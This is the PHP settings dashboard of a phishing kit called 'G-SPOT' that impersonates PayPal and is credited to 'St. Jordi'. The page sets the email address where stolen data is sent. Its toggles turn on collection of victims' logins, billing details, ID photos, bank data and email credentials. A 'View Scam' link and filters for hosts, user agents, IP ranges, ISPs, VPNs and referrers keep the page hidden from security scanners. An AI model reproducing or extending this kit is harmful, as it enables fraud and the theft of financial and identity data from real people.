<?php

error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
include '../main.php';
$file = "settingan.json";

$email_result = $setting['email_result'];
$sender_result = $setting['sender_mail'];
$letter = $setting['letter'];
$sett = file_get_contents($file);
$json = json_decode($sett);
$antibot =  $json[0]->status;
$send_login =  $json[1]->status;
$get_billing =  $json[2]->status;
$get_photo =  $json[3]->status;
$get_bank =  $json[4]->status;
$get_email =  $json[5]->status;
$onetime =  $json[6]->status;
$block_host =  $json[7]->status;
$block_ua =  $json[8]->status;
$block_iprange =  $json[9]->status;
$block_isp =  $json[10]->status;
$block_vpn =  $json[11]->status;
$block_referrer = $json[12]->status;
?>

<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>G-SPOT - Dashboard</title>
    <link rel = "icon" href = "css/basilisk.png" type = "image/x-icon"> 
    <!-- Custom fonts for this template-->
    <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link
        href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i"
        rel="stylesheet">

    <!-- Custom styles for this template-->
    <link href="css/sb-admin-2.min.css" rel="stylesheet">
    <script src="https://code.iconify.design/1/1.0.7/iconify.min.js"></script>

</head>

<body id="page-top">

    <!-- Page Wrapper -->
    <div id="wrapper">

        <!-- Sidebar -->
        <ul class="navbar-nav bg-gradient-dark sidebar sidebar-dark accordion" id="accordionSidebar">

            <!-- Sidebar - Brand -->
            <a class="sidebar-brand d-flex align-items-center justify-content-center" href="index.html">
                <div class="sidebar-brand-icon">
                <i class="iconify fa-2x" data-icon="logos:paypal"></i>
                </div>
                <div class="sidebar-brand-text mx-3">G-SPOT <sup>VIP <span class="iconify" data-icon="noto:crown" data-inline="false"></span></sup></div>
            </a>

            <!-- Divider -->
            <hr class="sidebar-divider my-0">

            <!-- Nav Item - Dashboard -->
            <li class="nav-item">
                <a class="nav-link" href="index.php">
                    <i class="fas fa-fw fa-tachometer-alt"></i>
                    <span>Dashboard</span></a>
            </li>

            <!-- Divider -->
            <hr class="sidebar-divider">

            <!-- Heading -->
            <div class="sidebar-heading">
                Interface
            </div>

            <!-- Nav Item - Pages Collapse Menu -->
            <li class="nav-item active">
                <a class="nav-link" href="setting.php">
                    <i class="fas fa-fw fa-cogs"></i>
                    <span>General Setting</span></a>
            </li>

            <!-- Nav Item - Utilities Collapse Menu -->
            <li class="nav-item">
                <a class="nav-link" href="antibot.php">
                    <i class="fas fa-fw fa-robot"></i>
                    <span>Antibot Setting</span></a>
            </li>

            <!-- Divider -->
            <hr class="sidebar-divider">

            <!-- Heading -->
            <div class="sidebar-heading">
                Addons
            </div>

            <!-- Nav Item - Charts -->
            <li class="nav-item">
                <a class="nav-link" href="bot.php">
                    <i class="fas fa-fw fa-bug"></i>
                    <span>Bot Detect</span></a>
            </li>

            <!-- Nav Item - Tables -->
            <li class="nav-item">
                <a class="nav-link" href="clear.php">
                    <i class="fas fa-fw fa-trash-alt"></i>
                    <span>Clear logs</span></a>
            </li>

            <!-- Divider -->
            <hr class="sidebar-divider d-none d-md-block">

            <!-- Sidebar Toggler (Sidebar) -->
            <div class="text-center d-none d-md-inline">
                <button class="rounded-circle border-0" id="sidebarToggle"></button>
            </div>

            <!-- Sidebar Message -->
            <div class="sidebar-card">
                <img class="sidebar-card-illustration mb-2" src="img/undraw_rocket.svg" alt="">
                <p class="text-center mb-2 text-white"><strong>G-SPOT</strong> make sure what's belong to you is yours!</p>
                <a class="btn btn-dark btn-sm" href="#">By St. Jordi</a>
            </div>

        </ul>
        <!-- End of Sidebar -->

        <!-- Content Wrapper -->
        <div id="content-wrapper" class="d-flex flex-column">

            <!-- Main Content -->
            <div id="content">

                <!-- Topbar -->
                <nav class="navbar navbar-expand navbar-dark bg-dark topbar mb-4 static-top shadow">

                    <!-- Sidebar Toggle (Topbar) -->
                    <button id="sidebarToggleTop" class="btn btn-link d-md-none rounded-circle mr-3">
                        <i class="fa fa-bars"></i>
                    </button>

                    <!-- Topbar Navbar -->
                    <ul class="navbar-nav ml-auto">

                        <div class="topbar-divider d-none d-sm-block"></div>

                        <!-- Nav Item - User Information -->
                        <li class="nav-item dropdown no-arrow">
                            <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button"
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                <span class="mr-2 d-none d-lg-inline text-gray-600 small"><font color="white">G-SPOT Member</font></span>
                                <img class="img-profile rounded-circle"
                                    src="img/undraw_profile.svg">
                            </a>
                            <!-- Dropdown - User Information -->
                            <div class="dropdown-menu dropdown-menu-right shadow animated--grow-in"
                                aria-labelledby="userDropdown">
                                <a class="dropdown-item" href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?=$site_parameter;?>" data-toggle="modal" data-target="#logoutModal">
                                    <i class="fas fa-sign-out-alt fa-sm fa-fw mr-2 text-red-400"></i>
                                    View Scam
                                </a>
                            </div>
                        </li>

                    </ul>

                </nav>
                <!-- End of Topbar -->

                <!-- Begin Page Content -->
                <div class="container-fluid">

                    <!-- Page Heading -->
                    <div class="d-sm-flex align-items-center justify-content-between mb-4">
                        <h1 class="h3 mb-0 text-gray-800">Setting</h1>
                    </div>

                    <!-- Content Row -->
                    <section class="section">
          <div class="section-header">
          </div>
        <div class="section-body">
            <div class="row">
          <div class="col-md-12">
            <div class="card ">
              <div class="card-body ">
              <p class="text-danger">*Settingan on | off <- Wajib huruf kecil <br />
              *Settingan limited | unusual_activity <- Wajib huruf kecil <br />
              *Jangan memakai karakter(Ex:!@#$%^&*_-=+) untuk parameter</p>
              <form action="" method="post" class="form-horizontal">
                <table class="table">
                  <thead class="text-dark">
                    <tr>
                      <th><strong>NAME</strong></th>
                      <th class="pl-4"><strong>NEW</strong></th>
                      <th class="pl-4"><strong>OLD</strong></th>
                      <th class="text-center"><strong>ACTION</strong></th>
                    </tr>
                  </thead>
                  <tbody class="text-dark">
                  <tr>
                      <td>
                        <strong>PARAMETER</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="parameterbaru" class="form-control" placeholder="<?=$site_parameter;?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="parameterlama" readonly value="<?= $site_parameter; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="parameter" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                  <tr>
                      <td>
                        <strong>EMAIL RESULT</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="emailresultbaru" class="form-control" placeholder="example@domain.com">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="emailresultlama" readonly value="<?= $email_result; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="email" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
					<tr>
                      <td>
                        <strong>SENDER EMAIL</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="senderemailbaru" class="form-control" placeholder="<?= $sender_result; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="senderemaillama" readonly value="<?= $sender_result; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="newsenderemail" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>LETTER</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="letterbaru" class="form-control" placeholder="<?= $letter; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="letterlama" readonly value="<?= $letter; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="newletter" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>SEND LOGIN</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="sendloginbaru" class="form-control" placeholder="<?= $send_login; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="sendloginlama" readonly value="<?= $send_login; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="sendlogin" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>GET BILLING</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="getbillingbaru" class="form-control" placeholder="<?= $get_billing; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="getbillinglama" readonly value="<?= $get_billing; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="getbilling" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>GET PHOTO</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="getphotobaru" class="form-control" placeholder="<?= $get_photo; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="getphotolama" readonly value="<?= $get_photo; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="getphoto" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>GET BANK</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="getbankbaru" class="form-control" placeholder="<?= $get_bank; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="getbanklama" readonly value="<?= $get_bank; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="getbank" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>GET EMAIL</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="getemailbaru" class="form-control" placeholder="<?= $get_email; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="getemaillama" readonly value="<?= $get_email; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="getemail" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>ONE TIME</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="onetimebaru" class="form-control" placeholder="<?= $onetime; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="onetimelama" readonly value="<?= $onetime; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="onetime" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>BLOCK REFERRER</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="blockrefbaru" class="form-control" placeholder="<?= $block_referrer; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="blockreflama" readonly value="<?= $block_referrer; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="blockref" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>BLOCK HOST</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="blockhostbaru" class="form-control" placeholder="<?= $block_host; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="blockhostlama" readonly value="<?= $block_host; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="blockhost" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>BLOCK USER AGENT</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="blockuabaru" class="form-control" placeholder="<?= $block_ua; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="blockualama" readonly value="<?= $block_ua; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="blockua" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>BLOCK IP RANGE</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="blockipbaru" class="form-control" placeholder="<?= $block_iprange; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="blockiplama" readonly value="<?= $block_iprange; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="blockip" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>BLOCK ISP</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="blockispbaru" class="form-control" placeholder="<?= $block_isp; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="blockisplama" readonly value="<?= $block_isp; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="blockisp" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>BLOCK VPN</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="blockvpnbaru" class="form-control" placeholder="<?= $block_vpn; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="blockvpnlama" readonly value="<?= $block_vpn; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="blockvpn" class="btn btn-success btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                  </tbody>
                    </table>
                  </div>
                </div>
              </div>
        </section>
                    </div>

                        </div>

                        
                    </div>

                </div>
                <!-- /.container-fluid -->

            </div>
            <!-- End of Main Content -->

            <!-- Footer -->
            <footer class="sticky-footer bg-dark">
                <div class="container my-auto">
                    <div class="copyright text-center my-auto text-light">
                        <span>Copyright &copy; G-SPOT by St. Jordi</span>
                    </div>
                </div>
            </footer>
            <!-- End of Footer -->

        </div>
        <!-- End of Content Wrapper -->

    </div>
    <!-- End of Page Wrapper -->

    <!-- Scroll to Top Button-->
    <a class="scroll-to-top rounded" href="#page-top">
        <i class="fas fa-angle-up"></i>
    </a>

    <!-- Bootstrap core JavaScript-->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <!-- Core plugin JavaScript-->
    <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

    <!-- Custom scripts for all pages-->
    <script src="js/sb-admin-2.min.js"></script>

    <!-- Page level plugins -->
    <script src="vendor/chart.js/Chart.min.js"></script>

    <!-- Page level custom scripts -->
    <script src="js/demo/chart-area-demo.js"></script>
      <script src="js/sweetalert.min.js"></script>
  <script src="js/scripts.js"></script>
    <script src="https://canvasjs.com/assets/script/canvasjs.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.nicescroll/3.7.6/jquery.nicescroll.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment.min.js"></script>
</body>

</html>
<?php
    $parameterbaru  = trim($_POST['parameterbaru']);
    $parameterlama  = trim($_POST['parameterlama']);
    $emailresultlama         = trim($_POST['emailresultlama']);
    $emailresultbaru         = trim($_POST['emailresultbaru']);
    $letterlama         = trim($_POST['letterlama']);
    $letterbaru         = trim($_POST['letterbaru']);
    $senderemaillama         = trim($_POST['senderemaillama']);
    $senderemailbaru         = trim($_POST['senderemailbaru']);
    $sendloginbaru  = trim($_POST['sendloginbaru']);
    $sendloginlama  = trim($_POST['sendloginlama']);
    $getbillingbaru = trim($_POST['getbillingbaru']);
    $getbillinglama = trim($_POST['getbillinglama']);
    $getphotobaru = trim($_POST['getphotobaru']);
    $getphotoblama = trim($_POST['getphotolama']);
    $getbankbaru  = trim($_POST['getbankbaru']);
    $getbanklama  = trim($_POST['getbanklama']);
    $getemailbaru = trim($_POST['getemailbaru']);
    $getemaillama = trim($_POST['getemaillama']);
    $onetimebaru  = trim($_POST['onetimebaru']);
    $onetimelama  = trim($_POST['onetimebaru']);
    $blockhostbaru  = trim($_POST['blockhostbaru']);
    $blockhostlama  = trim($_POST['blockhostlama']);
    $blockuabaru  = trim($_POST['blockuabaru']);
    $blockualama  = trim($_POST['blockualama']);
    $blockipbaru  = trim($_POST['blockipbaru']);
    $blockiplama  = trim($_POST['blockiplama']);
    $blockispbaru = trim($_POST['blockispbaru']);
    $blockisplama = trim($_POST['blockisplama']);
    $blockvpnbaru = trim($_POST['blockvpnbaru']);
    $blockvpnlama = trim($_POST['blockvpnlama']);
    $blockreflama = trim($_POST['blockreflama']);
    $blockrefbaru = trim($_POST['blockrefbaru']);
    $file         = "../main.php";
    $json  = "settingan.json";
    $tos  = file_get_contents($json);
    $isi          = file_get_contents($file);
 
if(isset($_POST['email'])) {
    if(preg_match("#\b$emailresultlama\b#is", $isi)) {
        $isi = str_replace($emailresultlama,$emailresultbaru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
        echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['parameter'])) {
  if(preg_match("#\b$parameterlama\b#is", $isi)) {
      $isi = str_replace($parameterlama,$parameterbaru,$isi);
      $buka = fopen($file,'w');
      fwrite($buka,$isi);
      fclose($buka);
      echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['newletter'])) {
    if(preg_match("#\b$letterlama\b#is", $isi)) {
        $isi = str_replace($letterlama,$letterbaru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
        echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['newsenderemail'])) {
    if(preg_match("#\b$senderemaillama\b#is", $isi)) {
        $isi = str_replace($senderemaillama,$senderemailbaru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
        echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['sendlogin'])) {
  if(preg_match("#\b".send_login."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'send_login') {
        $data[$key]['status'] = $sendloginbaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['getbilling'])) {
  if(preg_match("#\b".get_billing."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'get_billing') {
        $data[$key]['status'] = $getbillingbaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['getphoto'])) {
  if(preg_match("#\b".get_photo."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'get_photo') {
        $data[$key]['status'] = $getphotobaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['getbank'])) {
  if(preg_match("#\b".get_bank."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'get_bank') {
        $data[$key]['status'] = $getbankbaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['getemail'])) {
  if(preg_match("#\b".get_email."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'get_email') {
        $data[$key]['status'] = $getemailbaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['onetime'])) {
  if(preg_match("#\b".onetime."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'onetime') {
        $data[$key]['status'] = $onetimebaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['blockref'])) {
  if(preg_match("#\b".block_referrer."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'block_referrer') {
        $data[$key]['status'] = $blockrefbaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['blockhost'])) {
  if(preg_match("#\b".block_host."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'block_host') {
        $data[$key]['status'] = $blockhostbaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['blockua'])) {
  if(preg_match("#\b".block_ua."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'block_ua') {
        $data[$key]['status'] = $blockuabaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['blockip'])) {
  if(preg_match("#\b".block_iprange."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'block_iprange') {
        $data[$key]['status'] = $blockipbaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['blockisp'])) {
  if(preg_match("#\b".block_isp."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'block_isp') {
        $data[$key]['status'] = $blockispbaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['blockvpn'])) {
  if(preg_match("#\b".block_vpn."\b#is", $tos)) {
    $jsonString = file_get_contents('settingan.json');
    $data = json_decode($jsonString, true);
foreach ($data as $key => $entry) {
    if ($entry['function'] == 'block_vpn') {
        $data[$key]['status'] = $blockvpnbaru;
    }
}
$newJsonString = json_encode($data);
file_put_contents('settingan.json', $newJsonString);
    echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
      echo "<meta http-equiv='refresh' content='3; url=setting.php'/>";
  }
  else
       echo "<script>alert('Failed')</script>";
}
?>